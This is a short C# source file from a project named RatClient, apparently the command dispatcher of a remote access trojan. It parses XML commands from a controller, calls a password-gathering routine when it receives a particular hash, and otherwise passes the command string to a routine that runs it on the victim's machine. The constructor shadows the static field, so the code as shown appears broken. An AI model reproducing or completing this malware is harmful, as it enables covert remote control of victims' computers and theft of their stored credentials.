using RatClient.WebGather;
using System.Xml;



namespace RatClient
{
    public class FilterCommands
    {
        static XmlDocument xmlDoc;
        public FilterCommands()
        {
            XmlDocument xmlDoc = new XmlDocument();
        }
        public byte[] Run(string data)
        {
            
            xmlDoc.LoadXml(data);
            string command = xmlDoc.SelectSingleNode("/manager/command").InnerText;
            if (command == string.Empty)
            {
                return null;
            }
            else if(command == "5df297c2f2da83a8b45cfd012fbf9b3c")
            {
                string type = xmlDoc.SelectSingleNode("/manager/type").InnerText;
                string web = xmlDoc.SelectSingleNode("/manager/web").InnerText;
                return Passwords.Gather(web, type);
            }
            else
            {
                return Tools.RunCommand(command);
            }
        } 
    }
}
